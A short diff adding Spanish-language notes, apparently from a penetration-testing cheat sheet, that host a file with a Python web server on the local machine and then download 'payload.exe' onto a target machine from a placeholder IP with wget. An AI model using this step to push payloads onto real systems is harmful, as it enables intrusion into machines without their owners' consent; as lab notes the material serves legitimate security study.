@@ -1,0 +1,5 @@
+Desde la maquina local:
+sudo python3 -m http.server 80 
+
+desde la maquina objetivo: 
+wget http://tu_direccion_ip/payload.exe -OutFile payload.exe
